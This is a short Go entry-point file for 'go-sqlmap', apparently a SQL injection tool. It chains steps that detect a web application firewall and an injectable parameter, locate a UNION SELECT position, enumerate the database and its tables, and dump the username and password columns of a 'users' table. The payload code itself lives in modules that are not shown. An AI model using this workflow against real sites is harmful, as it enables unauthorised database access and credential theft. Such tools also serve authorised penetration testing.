package main

import (
	"go-sqlmap/core"
	"go-sqlmap/log"
	"go-sqlmap/util"
)

const (
	version = "0.1"
	author  = "4ra1n"
	url     = "https://github.com/EmYiQing/go-sqlmap"
)

func main() {
	core.PrintLogo(version, author, url)
	params := core.ParseInput()
	target := util.CheckUrl(params.Url)
	log.Info("target is " + target)
	core.DetectAlive(target)
	core.DetectWaf(target)
	core.DetectSqlInject(target)
	suffix := core.GetSuffix(params.Url)
	key := core.GetOrderByNum(suffix, target)
	cleanUrl := util.GetCleanUrl(target)
	pos := core.GetUnionSelectPos(suffix, cleanUrl, key)
	core.GetVersion(pos, suffix, cleanUrl, key)
	core.GetDatabase(pos, suffix, cleanUrl, key)
	core.GetAllTables(pos, suffix, cleanUrl, key)
	core.GetColumns(pos, suffix, cleanUrl, key, "users")
	core.GetData(pos, suffix, cleanUrl, key, "users", []string{"id", "username", "password"})

}
